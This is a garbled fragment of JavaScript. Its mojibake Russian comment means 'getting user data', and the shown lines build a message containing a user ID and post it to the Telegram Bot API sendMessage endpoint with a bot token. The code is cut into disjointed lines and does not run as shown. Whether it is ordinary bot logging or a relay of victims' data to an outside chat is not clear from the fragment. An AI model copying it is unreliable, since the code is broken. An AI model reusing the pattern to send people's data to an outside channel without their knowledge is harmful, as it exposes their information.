        // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        async function getUserData() {

                         + `User ID: ${userData.id}\n`

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {

                    body: JSON.stringify({

            } catch (e) {
